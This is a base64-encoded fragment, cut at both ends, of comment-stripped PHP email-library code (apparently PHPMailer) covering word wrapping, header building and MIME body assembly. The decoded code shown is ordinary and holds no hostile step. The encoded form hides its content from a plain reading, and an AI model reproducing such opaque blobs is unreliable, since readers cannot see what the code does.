nZSwgMCwgLSRsZWxlbik7DQogICAgICAgIH0NCiAgICAgICAgJGxpbmVzICAgPSBleHBsb2RlKCR0aGlzLT5MRSwgJG1lc3NhZ2UpOw0KICAgICAgICAkbWVzc2FnZSA9ICcnOw0KICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGxpbmUpIHsNCiAgICAgICAgICAgICR3b3JkcyAgICAgPSBleHBsb2RlKCcgJywgJGxpbmUpOw0KICAgICAgICAgICAgJGJ1ZiAgICAgICA9ICcnOw0KICAgICAgICAgICAgJGZpcnN0d29yZCA9IHRydWU7DQogICAgICAgICAgICBmb3JlYWNoICgkd29yZHMgYXMgJHdvcmQpIHsNCiAgICAgICAgICAgICAgICBpZiAoJHFwX21vZGUgYW5kIChzdHJsZW4oJHdvcmQpID4gJGxlbmd0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJHNwYWNlX2xlZnQgPSAkbGVuZ3RoIC0gc3RybGVuKCRidWYpIC0gJGNybGZsZW47DQogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzcGFjZV9sZWZ0ID4gMjApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHNwYWNlX2xlZnQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gPSAkdGhpcy0+dXRmOENoYXJCb3VuZGFyeSgkd29yZCwgJGxlbik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDEsIDEpID09ICc9Jykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDIsIDEpID09ICc9Jykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuIC09IDI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYXJ0ID0gc3Vic3RyKCR3b3JkLCAwLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkd29yZCA9IHN1YnN0cigkd29yZCwgJGxlbik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICcgLiAkcGFydDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmIC4gc3ByaW50ZignPSVzJywgc2VsZjo6Q1JMRik7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiAkc29mdF9icmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAnJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB3aGlsZSAoc3RybGVuKCR3b3JkKSA+IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkbGVuZ3RoIDw9IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gPSAkbGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSA9PSAnPScpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkgPT0gJz0nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiAtPSAyOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHdvcmQgPSBzdWJzdHIoJHdvcmQsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkd29yZCkgPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJHBhcnQgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICRwYXJ0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJGJ1Zl9vID0gJGJ1ZjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCEkZmlyc3R3b3JkKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICcgJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICR3b3JkOw0KICAgICAgICAgICAgICAgICAgICBpZiAoc3RybGVuKCRidWYpID4gJGxlbmd0aCBhbmQgJGJ1Zl9vICE9ICcnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmX28gLiAkc29mdF9icmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkd29yZDsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkZmlyc3R3b3JkID0gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmIC4gc2VsZjo6Q1JMRjsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJG1lc3NhZ2U7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiB1dGY4Q2hhckJvdW5kYXJ5KCRlbmNvZGVkVGV4dCwgJG1heExlbmd0aCkgew0KICAgICAgICAkZm91bmRTcGxpdFBvcyA9IGZhbHNlOw0KICAgICAgICAkbG9va0JhY2sgICAgICA9IDM7DQogICAgICAgIHdoaWxlICghJGZvdW5kU3BsaXRQb3MpIHsNCiAgICAgICAgICAgICRsYXN0Q2h1bmsgICAgICA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2ssICRsb29rQmFjayk7DQogICAgICAgICAgICAkZW5jb2RlZENoYXJQb3MgPSBzdHJwb3MoJGxhc3RDaHVuaywgJz0nKTsNCiAgICAgICAgICAgIGlmIChmYWxzZSAhPT0gJGVuY29kZWRDaGFyUG9zKSB7DQogICAgICAgICAgICAgICAgJGhleCA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2sgKyAkZW5jb2RlZENoYXJQb3MgKyAxLCAyKTsNCiAgICAgICAgICAgICAgICAkZGVjID0gaGV4ZGVjKCRoZXgpOw0KICAgICAgICAgICAgICAgIGlmICgkZGVjIDwgMTI4KSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkZW5jb2RlZENoYXJQb3MgPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkbWF4TGVuZ3RoID0gJG1heExlbmd0aCAtICgkbG9va0JhY2sgLSAkZW5jb2RlZENoYXJQb3MpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA+PSAxOTIpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1heExlbmd0aCAgICAgPSAkbWF4TGVuZ3RoIC0gKCRsb29rQmFjayAtICRlbmNvZGVkQ2hhclBvcyk7DQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA8IDE5Mikgew0KICAgICAgICAgICAgICAgICAgICAkbG9va0JhY2sgKz0gMzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJG1heExlbmd0aDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldFdvcmRXcmFwKCkgew0KICAgICAgICBpZiAoJHRoaXMtPldvcmRXcmFwIDwgMSkgew0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgew0KICAgICAgICAgICAgY2FzZSAnYWx0JzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmUnOg0KICAgICAgICAgICAgY2FzZSAnYWx0X2F0dGFjaCc6DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkFsdEJvZHksICR0aGlzLT5Xb3JkV3JhcCk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICR0aGlzLT5Cb2R5ID0gJHRoaXMtPndyYXBUZXh0KCR0aGlzLT5Cb2R5LCAkdGhpcy0+V29yZFdyYXApOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGVIZWFkZXIoKSB7DQogICAgICAgICRyZXN1bHQgPSAnJzsNCiAgICAgICAgaWYgKCR0aGlzLT5NZXNzYWdlRGF0ZSA9PSAnJykgew0KICAgICAgICAgICAgJHRoaXMtPk1lc3NhZ2VEYXRlID0gc2VsZjo6cmZjRGF0ZSgpOw0KICAgICAgICB9DQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0RhdGUnLCAkdGhpcy0+TWVzc2FnZURhdGUpOw0KICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7DQogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvYWRkcikgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U2luZ2xlVG9BcnJheVtdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKGNvdW50KCR0aGlzLT50bykgPiAwKSB7DQogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7DQogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1RvJywgJHRoaXMtPnRvKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2VpZiAoY291bnQoJHRoaXMtPmNjKSA9PSAwKSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnRnJvbScsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgdHJpbSgkdGhpcy0+RnJvbSksDQogICAgICAgICAgICAgICAgJHRoaXMtPkZyb21OYW1lDQogICAgICAgICAgICApDQogICAgICAgICkpOw0KICAgICAgICBpZiAoY291bnQoJHRoaXMtPmNjKSA+IDApIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0NjJywgJHRoaXMtPmNjKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoKCR0aGlzLT5NYWlsZXIgPT0gJ3NlbmRtYWlsJyBvciAkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcgb3IgJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpIGFuZCBjb3VudCgkdGhpcy0+YmNjKSA+IDApIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0JjYycsICR0aGlzLT5iY2MpOw0KICAgICAgICB9DQogICAgICAgIGlmIChjb3VudCgkdGhpcy0+UmVwbHlUbykgPiAwKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdSZXBseS1UbycsICR0aGlzLT5SZXBseVRvKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1N1YmplY3QnLCAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCcnICE9ICR0aGlzLT5NZXNzYWdlSUQgYW5kIHByZWdfbWF0Y2goJy9ePC4qQC4qPiQvJywgJHRoaXMtPk1lc3NhZ2VJRCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5sYXN0TWVzc2FnZUlEID0gJHRoaXMtPk1lc3NhZ2VJRDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5sYXN0TWVzc2FnZUlEID0gc3ByaW50ZignPCVzQCVzPicsICR0aGlzLT51bmlxdWVpZCwgJHRoaXMtPnNlcnZlckhvc3RuYW1lKCkpOw0KICAgICAgICB9DQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ01lc3NhZ2UtSUQnLCAkdGhpcy0+bGFzdE1lc3NhZ2VJRCk7DQogICAgICAgIGlmICghaXNfbnVsbCgkdGhpcy0+UHJpb3JpdHkpKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdYLVByaW9yaXR5JywgJHRoaXMtPlByaW9yaXR5KTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPkNvbmZpcm1SZWFkaW5nVG8gIT0gJycpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0Rpc3Bvc2l0aW9uLU5vdGlmaWNhdGlvbi1UbycsICc8JyAuICR0aGlzLT5Db25maXJtUmVhZGluZ1RvIC4gJz4nKTsNCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+Q3VzdG9tSGVhZGVyIGFzICRoZWFkZXIpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUodHJpbSgkaGVhZGVyWzBdKSwgJHRoaXMtPmVuY29kZUhlYWRlcih0cmltKCRoZWFkZXJbMV0pKSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkdGhpcy0+c2lnbl9rZXlfZmlsZSkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTUlNRS1WZXJzaW9uJywgJzEuMCcpOw0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+Z2V0TWFpbE1JTUUoKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldE1haWxNSU1FKCkgew0KICAgICAgICAkcmVzdWx0ICAgICAgPSAnJzsNCiAgICAgICAgJGlzbXVsdGlwYXJ0ID0gdHJ1ZTsNCiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7DQogICAgICAgICAgICBjYXNlICdpbmxpbmUnOg0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYXR0YWNoJzoNCiAgICAgICAgICAgIGNhc2UgJ2lubGluZV9hdHRhY2gnOg0KICAgICAgICAgICAgY2FzZSAnYWx0X2F0dGFjaCc6DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9taXhlZDsnKTsNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0JzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmUnOg0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoJ0NvbnRlbnQtVHlwZTogJyAuICR0aGlzLT5Db250ZW50VHlwZSAuICc7IGNoYXJzZXQ9JyAuICR0aGlzLT5DaGFyU2V0KTsNCiAgICAgICAgICAgICAgICAkaXNtdWx0aXBhcnQgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPkVuY29kaW5nICE9ICc3Yml0Jykgew0KICAgICAgICAgICAgaWYgKCRpc211bHRpcGFydCkgew0KICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+RW5jb2RpbmcgPT0gJzhiaXQnKSB7DQogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAnOGJpdCcpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICR0aGlzLT5FbmNvZGluZyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFNlbnRNSU1FTWVzc2FnZSgpIHsNCiAgICAgICAgcmV0dXJuIHJ0cmltKCR0aGlzLT5NSU1FSGVhZGVyIC4gJHRoaXMtPm1haWxIZWFkZXIsICJcblxyIikgLiBzZWxmOjpDUkxGIC4gc2VsZjo6Q1JMRiAuICR0aGlzLT5NSU1FQm9keTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdlbmVyYXRlSWQoKSB7DQogICAgICAgIHJldHVybiBtZDUodW5pcWlkKHRpbWUoKSkpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY3JlYXRlQm9keSgpIHsNCiAgICAgICAgJGJvZHkgICAgICAgICAgICAgID0gJyc7DQogICAgICAgICR0aGlzLT51bmlxdWVpZCAgICA9ICR0aGlzLT5nZW5lcmF0ZUlkKCk7DQogICAgICAgICR0aGlzLT5ib3VuZGFyeVsxXSA9ICdiMV8nIC4gJHRoaXMtPnVuaXF1ZWlkOw0KICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMl0gPSAnYjJfJyAuICR0aGlzLT51bmlxdWVpZDsNCiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzNdID0gJ2IzXycgLiAkdGhpcy0+dW5pcXVlaWQ7DQogICAgICAgIGlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgew0KICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldE1haWxNSU1FKCkgLiAkdGhpcy0+TEU7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPnNldFdvcmRXcmFwKCk7DQogICAgICAgICRib2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7DQogICAgICAgICRib2R5Q2hhclNldCAgPSAkdGhpcy0+Q2hhclNldDsNCiAgICAgICAgaWYgKCRib2R5RW5jb2RpbmcgPT0gJzhiaXQnIGFuZCAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+Qm9keSkpIHsNCiAgICAgICAgICAgICRib2R5RW5jb2RpbmcgPSAnN2JpdCc7DQogICAgICAgICAgICAkYm9keUNoYXJTZXQgID0gJ3VzLWFzY2lpJzsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJ2Jhc2U2NCcgIT0gJHRoaXMtPkVuY29kaW5nIGFuZCBzZWxmOjpoYXNMaW5lTG9uZ2VyVGhhbk1heCgkdGhpcy0+Qm9keSkpIHsNCiAgICAgICAgICAgICRib2R5RW5jb2RpbmcgPSAncXVvdGVkLXByaW50YWJsZSc7DQogICAgICAgIH0NCiAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9ICR0aGlzLT5FbmNvZGluZzsNCiAgICAgICAgJGFsdEJvZHlDaGFyU2V0ICA9ICR0aGlzLT5DaGFyU2V0Ow0KICAgICAgICBpZiAoJGFsdEJvZHlFbmNvZGluZyA9PSAnOGJpdCcgYW5kICEkdGhpcy0+aGFzOGJpdENoYXJzKCR0aGlzLT5BbHRCb2R5KSkgew0KICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9ICc3Yml0JzsNCiAgICAgICAgICAgICRhbHRCb2R5Q2hhclNldCAgPSAndXMtYXNjaWknOw0KICAgICAgICB9DQogICAgICAgIGlmICgnYmFzZTY0JyAhPSAkYWx0Qm9keUVuY29kaW5nIGFuZCBzZWxmOjpoYXNMaW5lTG9uZ2VyVGhhbk1heCgkdGhpcy0+QWx0Qm9keSkpIHsNCiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAncXVvdGVkLXByaW50YWJsZSc7DQogICAgICAgIH0NCiAgICAgICAgJG1pbWVwcmUgPSAiVGhpcyBpcyBhIG11bHRpLXBhcnQgbWVzc2FnZSBpbiBNSU1FIGZvcm1hdC4iIC4gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsNCiAgICAgICAgICAgIGNhc2UgJ2lubGluZSc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhdHRhY2gnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2lubGluZV9hdHRhY2gnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhbHQnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRhbHRCb2R5Q2hhclNldCwgJ3RleHQvcGxhaW4nLCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAndGV4dC9odG1sJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkljYWwpKSB7DQogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICcnLC